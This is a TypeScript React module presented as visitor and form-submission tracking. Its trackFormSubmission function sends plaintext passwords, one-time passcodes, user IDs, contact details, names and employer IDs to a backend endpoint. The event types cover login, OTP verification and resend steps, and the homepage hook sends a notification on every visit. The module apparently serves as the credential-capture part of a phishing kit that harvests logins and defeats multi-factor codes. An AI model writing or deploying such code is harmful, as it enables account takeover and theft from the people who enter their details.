'use client'

import { useEffect } from 'react'

export function useVisitorTracking() {
  useEffect(() => {
    const trackVisitor = async () => {
      try {
        if (typeof window === 'undefined') return

        // Limit visit notifications to homepage only
        if (window.location.pathname !== '/') return

        // Get additional client-side data
        const screenData = {
          screen: `${window.screen.width}x${window.screen.height}`,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          language: navigator.language
        }

        const res = await fetch('/api/visitor', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(screenData)
        })

        // No per-browser caching here: send on every homepage visit
      } catch (error) {
        console.error('Failed to track visitor:', error)
      }
    }

    trackVisitor()
  }, [])
}

export async function trackFormSubmission(data: {
  type: 'login' | 'registration' | 'email_verification' | 'text_verification'
    | 'login_email_otp_verification' | 'login_text_otp_verification'
    | 'login_email_otp_resend' | 'login_text_otp_resend' | 'login_did_not_receive_code'
    | 'personal_info_lookup' | 'employer_name_lookup' | 'contact_info'
    | 'registration_email_otp_resend' | 'registration_text_otp_resend' | 'registration_did_not_receive_code'
  userId?: string
  password?: string
  email?: string
  phone?: string
  otp?: string
  firstName?: string
  lastName?: string
  zipCode?: string
  employerId?: string
  page: string
}): Promise<boolean> {
  const formData = {
    ...data,
    timestamp: new Date().toISOString()
  }

  try {
    const res = await fetch('/api/form-submission', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(formData)
    })
    return res.ok
  } catch (error) {
    console.error('Failed to track form submission:', error)
    return false
  }
}
